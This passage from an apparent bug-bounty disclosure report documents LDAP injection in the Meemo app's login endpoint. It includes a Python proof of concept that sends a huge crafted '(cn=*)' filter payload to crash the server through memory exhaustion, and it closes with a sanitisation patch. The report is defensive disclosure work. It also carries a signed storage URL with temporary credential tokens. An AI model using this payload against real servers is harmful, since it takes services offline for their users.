class=\"nx\"\u003ereq\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esession\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003euserId\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eresult\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003euser\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eusername\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n        \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003etoken\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003euuid\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ev4\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003etokens\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eadd\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003etoken\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eresult\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003euser\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eusername\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003enext\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eHttpError\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e500\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n            \u003cspan class=\"nx\"\u003enext\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eHttpSuccess\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e201\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"na\"\u003etoken\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003etoken\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"na\"\u003euser\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003eresult\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003euser\u003c/span\u003e \u003cspan class=\"p\"\u003e}));\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"p\"\u003e...\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"c1\"\u003e// https://github.com/nebulade/meemo/blob/master/app.js#L55\u003c/span\u003e\n\u003cspan class=\"p\"\u003e...\u003c/span\u003e\n\u003cspan class=\"nx\"\u003erouter\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003epost\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e/api/login\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eroutes\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elogin\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"p\"\u003e...\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cp\u003eTo test this app on a real live system, you need first to install \u003ccode\u003eCloudron\u003c/code\u003e (\u003ca title=\"https://cloudron.io/get.html\" href=\"/redirect?url=https%3A%2F%2Fcloudron.io%2Fget.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://cloudron.io/get.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) and then install the \u003ccode\u003eMeemo\u003c/code\u003e app (\u003ca title=\"https://cloudron.io/store/de.nebulon.guacamoly.html\" href=\"/redirect?url=https%3A%2F%2Fcloudron.io%2Fstore%2Fde.nebulon.guacamoly.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://cloudron.io/store/de.nebulon.guacamoly.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e). In order to install the \u003ccode\u003eCloudron\u003c/code\u003e app you need first a domain. \u003c/p\u003e\n\n\u003cp\u003eInstead of the above setting, I tested the app locally. \u003cbr\u003e\nBelow steps to reproduce the vulnerability.\u003c/p\u003e\n\n\u003cp\u003eTo simulate an LDAP server for users authentication, I used a test server provided by the same author (\u003ca title=\"https://github.com/nebulade/ldapjstestserver\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fnebulade%2Fldapjstestserver\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/nebulade/ldapjstestserver\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) (you can find attached).\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003einstall (\u003ca title=\"https://docs.mongodb.com/manual/tutorial/install-mongodb-on-ubuntu/\" href=\"/redirect?url=https%3A%2F%2Fdocs.mongodb.com%2Fmanual%2Ftutorial%2Finstall-mongodb-on-ubuntu%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://docs.mongodb.com/manual/tutorial/install-mongodb-on-ubuntu/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) and start MongoDB:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003esudo systemctl start mongod\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003ecreate a directory for testing\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003emkdir poc\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ecd poc/\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003einstall \u003ccode\u003emeemo-app\u003c/code\u003e module:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e \u003ccode\u003egit clone https://github.com/nebulade/meemo.git\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ecd meemo\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003enpm i\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e./node_modules/.bin/gulp\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003estart the LDAP test server (we are in \u003ccode\u003epoc/meemo/\u003c/code\u003e):\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e \u003ccode\u003enode ldapjstestserver.js\u003c/code\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003estart the \u003ccode\u003emeemo\u003c/code\u003e app locally (we need to setup some environment variables to enable the LDAP authentication):\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eCLOUDRON_LDAP_BIND_DN=\u0026quot;cn=admin,ou=users,dc=example\u0026quot; CLOUDRON_LDAP_BIND_PASSWORD=\u0026quot;password\u0026quot; CLOUDRON_LDAP_USERS_BASE_DN=\u0026quot;ou=users,dc=example\u0026quot; CLOUDRON_LDAP_URL=\u0026quot;ldap://localhost:3002\u0026quot; node app.js\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eBefore performing the attack let\u0026#39;s first check that everything works as expected:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003evisit \u003ccode\u003ehttp://localhost:3000/\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eenter \u003ccode\u003enormal\u003c/code\u003e and \u003ccode\u003etest\u003c/code\u003e respectively in the \u003ccode\u003eusername\u003c/code\u003e and \u003ccode\u003epassword\u003c/code\u003e fields and the click enter\u003c/li\u003e\n\u003cli\u003elogout \u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eReproduce the attack:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003evisit \u003ccode\u003ehttp://localhost:3000/\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003erun the following \u003ccode\u003epython\u003c/code\u003e script (\u003ccode\u003epoc.py\u003c/code\u003e):\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003erequests\u003c/span\u003e\n\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003ejson\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003eurl\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;http://localhost:3000/api/login\u0026#39;\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003epayload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;*)\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;(cn=*)\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"mi\"\u003e700000\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;(cn=*\u0026quot;\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Payload\u0026#39;s length: {len(payload)} characters\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003eheaders\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;Content-type\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;application/json\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;Accept\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;text/plain\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003edata\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"s\"\u003e\u0026quot;username\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"n\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"s\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;pass\u0026quot;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003eresponse\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003erequests\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003epost\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003ejson\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003edumps\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"n\"\u003eheaders\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003eheaders\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003ethe page will load until the server crashes. After some time you will get the following error:\n\u003ccode\u003eFATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed - JavaScript heap out of memory\u003c/code\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eIf an attacker send one (like in my case) or multiple requests like in the previous example, he/she could potentially makes the service unavaible and consumes all the server resources, leading to DoS.\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"poc.mov\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/yXQuULnGRUoEjAvMSF36Cpm8?response-content-disposition=attachment%3B%20filename%3D%22poc.mov%22%3B%20filename%2A%3DUTF-8%27%27poc.mov\u0026amp;response-content-type=video%2Fquicktime\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3UNE4J5L%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070944Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCz7kjO3QyFP7jGDkA5krNaLE6O2p1tR4x0TQtjMemDwQIhALc5Qo7beEygqpMNylJrOurNEmXX%2FUaJ7i3JOGstSxsEKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgxX2Y8wmCeqyUWE5MQqkQO1SEq9Kl%2BewQlhrlfUoVvv9N1OLaMkWrWIlv8SukYusm40FYD0qUCOJT%2BzitdeP3Kr9dqa%2BJmxV7c3%2BjXo4WulUP6OrfhUn0Rcu3T1VRcH6Qpx%2FGLAa4zE5IBGMdsXZEcR335EaBEylCpdLxObdeJZ8wmT%2FiMsJqVnexQRWK0gOcg8%2BaAe0Z4MQhfL%2FVbk8%2Botr0dFlI%2FaPx8jXCrTw%2FTlRp0P9OtpSvUQA1RBVrS5L3ZNrC33bQ4md%2B9KmXmIycB047RJuvaypZW9qepGhczrUMsYabbxifZ%2FJ17yJLs39h1ENkrjIFD7f9gA%2F9u%2BsTKrtFMmGu8%2FrThH1%2FAJX2J2V%2FiXJ%2Fj2flmFEXmyNg7XqFuZ2VEFhEknqlw0sjyH5ibXryf8lYs%2FL9ye%2FbGye3G8MgjG1rQQkaNLm9nZxru2uR4y5NwW33D%2F%2F27wPuxj5YAD30GEm3l3%2BfNuoV8Y%2Fa6KBiEG2ZFNI%2Fu9t%2F7aALxmsSX49Fkt%2Fvbd%2B2ORICgPABnOO5GRZQldPJ3fh%2FPtVXm3oDDyjav%2FBTrqAWjMucnwKi73c9CZ4eV75rJ5%2B4PnghCALwGiHX4zE11a5NOtuIpj8v3a2y9AJMGR0JyOdjGEipkC8KkLqeEMFaYnCk4oCce5NwJVnhh%2F8yBh%2BJDy7WhfYG2qUirylB1Ud3rl1KSDWno%2BbVYDQgs2rcyOKmLb%2FH1USBmJPVZi3%2FK%2F%2FJ6%2BATEV10VMohl2iHY7GlXPewFvZ2tG%2FogGkzwNQUb%2BD2o7r0beeLXek5XslTtgqNCoDP9xL1i88F02X5Buj81GAIlEB1qQFUoRMd2N%2Fu0SnL64HSNiPSzstRRJidfEI6C%2F%2FcDv%2BmWfcA%3D%3D\u0026amp;X-Amz-Signature=202a4215a8a2167fd89f1d5801b09d73ff80f86e10dfd99bcaefbabfe6601cee\" data-attachment-type=\"video/quicktime\"\u003e\u003cvideo controls=\"controls\" src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/yXQuULnGRUoEjAvMSF36Cpm8?response-content-disposition=attachment%3B%20filename%3D%22poc.mov%22%3B%20filename%2A%3DUTF-8%27%27poc.mov\u0026amp;response-content-type=video%2Fquicktime\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3UNE4J5L%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070944Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCz7kjO3QyFP7jGDkA5krNaLE6O2p1tR4x0TQtjMemDwQIhALc5Qo7beEygqpMNylJrOurNEmXX%2FUaJ7i3JOGstSxsEKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgxX2Y8wmCeqyUWE5MQqkQO1SEq9Kl%2BewQlhrlfUoVvv9N1OLaMkWrWIlv8SukYusm40FYD0qUCOJT%2BzitdeP3Kr9dqa%2BJmxV7c3%2BjXo4WulUP6OrfhUn0Rcu3T1VRcH6Qpx%2FGLAa4zE5IBGMdsXZEcR335EaBEylCpdLxObdeJZ8wmT%2FiMsJqVnexQRWK0gOcg8%2BaAe0Z4MQhfL%2FVbk8%2Botr0dFlI%2FaPx8jXCrTw%2FTlRp0P9OtpSvUQA1RBVrS5L3ZNrC33bQ4md%2B9KmXmIycB047RJuvaypZW9qepGhczrUMsYabbxifZ%2FJ17yJLs39h1ENkrjIFD7f9gA%2F9u%2BsTKrtFMmGu8%2FrThH1%2FAJX2J2V%2FiXJ%2Fj2flmFEXmyNg7XqFuZ2VEFhEknqlw0sjyH5ibXryf8lYs%2FL9ye%2FbGye3G8MgjG1rQQkaNLm9nZxru2uR4y5NwW33D%2F%2F27wPuxj5YAD30GEm3l3%2BfNuoV8Y%2Fa6KBiEG2ZFNI%2Fu9t%2F7aALxmsSX49Fkt%2Fvbd%2B2ORICgPABnOO5GRZQldPJ3fh%2FPtVXm3oDDyjav%2FBTrqAWjMucnwKi73c9CZ4eV75rJ5%2B4PnghCALwGiHX4zE11a5NOtuIpj8v3a2y9AJMGR0JyOdjGEipkC8KkLqeEMFaYnCk4oCce5NwJVnhh%2F8yBh%2BJDy7WhfYG2qUirylB1Ud3rl1KSDWno%2BbVYDQgs2rcyOKmLb%2FH1USBmJPVZi3%2FK%2F%2FJ6%2BATEV10VMohl2iHY7GlXPewFvZ2tG%2FogGkzwNQUb%2BD2o7r0beeLXek5XslTtgqNCoDP9xL1i88F02X5Buj81GAIlEB1qQFUoRMd2N%2Fu0SnL64HSNiPSzstRRJidfEI6C%2F%2FcDv%2BmWfcA%3D%3D\u0026amp;X-Amz-Signature=202a4215a8a2167fd89f1d5801b09d73ff80f86e10dfd99bcaefbabfe6601cee\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/video\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"patch\"\u003ePatch\u003c/h2\u003e\n\n\u003cp\u003eSanitize the user input before using it to build LDAP filters.\u003c/p\u003e\n\n\u003cp\u003ePossible solution could be for example this one (taken from another project):\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eGithub Issue: \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fvesse%2Fnode-ldapauth-fork%2Fissues%2F21\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eVulnerable to ldap injection\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003eGithub Commit: \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fvesse%2Fnode-ldapauth-fork%2Fcommit%2F3feea43e243698bcaeffa904a7324f4d96df60e4\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eSanitize user input: Replace the specific special characters with codes as defined in LDAP specification.\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e \u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eInspired by the same issue (\u003ca title=\"https://github.com/vesse/node-ldapauth-fork/issues/21\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fvesse%2Fnode-ldapauth-fork%2Fissues%2F21\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/vesse/node-ldapauth-fork/issues/21\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e), here there are the RFC specifications (\u003ca title=\"https://tools.ietf.org/search/rfc4515#section-3):\" href=\"/redirect?url=https%3A%2F%2Ftools.ietf.org%2Fsearch%2Frfc4515%23section-3%29%3A\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://tools.ietf.org/search/rfc4515#section-3):\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e    The rule ensures that the entire filter string is a\n    valid UTF-8 string and provides that the octets that represent the\n    ASCII characters \u0026quot;*\u0026quot; (ASCII 0x2a), \u0026quot;(\u0026quot; (ASCII 0x28), \u0026quot;)\u0026quot; (ASCII\n    0x29), \u0026quot;\u0026quot; (ASCII 0x5c), and NUL (ASCII 0x00) are represented as a\n    backslash \u0026quot;\u0026quot; (ASCII 0x5c) followed by the two hexadecimal digits\n    representing the value of the encoded octet.\n\n    This simple escaping mechanism eliminates filter-parsing ambiguities\n    and allows any filter that can be represented in LDAP to be\n    represented as a NUL-terminated string. Other octets that are part\n    of the set may be escaped using this mechanism, for example,\n    non-printing ASCII characters.\n\n    For AssertionValues that contain UTF-8 character data, each octet of\n    the character to be escaped is replaced by a backslash and two hex\n    digits, which form a single octet in the code of the character. For\n    example, the filter checking whether the \u0026quot;cn\u0026quot; attribute contained a\n    value with the character \u0026quot;\u0026quot; anywhere in it would be represented as\n    \u0026quot;(cn=\\2a*)\u0026quot;.\n\n    As indicated by the rule, implementations MUST escape\n    all octets greater than 0x7F that are not part of a valid UTF-8\n    encoding sequence when they generate a string representation of a\n    search filter. Implementations SHOULD accept as input strings that\n    are not valid UTF-8 strings. This is necessary because RFC 2254 did\n    not clearly define the term \u0026quot;string representation\u0026quot; (and in\n    particular did not mention that the string representation of an LDAP\n    search filter is a string of UTF-8-encoded Unicode characters).\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cp\u003eSome helpful resources I used for this research:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FLDAP_injection\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eLDAP injection\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fldap.com%2Fldap-filters%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eLDAP Filters\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fwww.blackhat.com%2Fpresentations%2Fbh-europe-08%2FAlonso-Parada%2FWhitepaper%2Fbh-eu-08-alonso-parada-WP.pdf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eBlackHat: LDAP Injection \u0026amp; Blind LDAP Injection\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fldap.com%2F2018%2F05%2F04%2Funderstanding-and-defending-against-ldap-injection-attacks%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eUnderstanding and Defending Against LDAP Injection Attacks\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fcheatsheetseries.owasp.org%2Fcheatsheets%2FLDAP_Injection_Prevention_Cheat_Sheet.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eLDAP Injection Prevention Cheat Sheet\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/redirect?url=http%3A%2F%2Fldapjs.org%2Ffilters.html%23orfilter\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eLdapjs - orfilter\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eMy setup:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eOPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\u003c/li\u003e\n\u003cli\u003eNODEJS VERSION: v14.2.0\u003c/li\u003e\n\u003cli\u003eNPM VERSION: 6.14.4\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch1 id=\"wrap-up\"\u003eWrap up\u003c/h1\u003e\n\n\u003cul\u003e\n\u003cli\u003eI contacted the maintainer to let them know: [N] \u003c/li\u003e\n\u003cli\u003eI opened an issue in the related repository: [N] \u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThank you for your time.\u003c/p\u003e\n\n\u003cp\u003ebest regards,\u003c/p\u003e\n\n\u003cp\u003ed3lla\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eDenial of service\u003c/p\u003e\n","weakness":{"id":99,"name":"LDAP 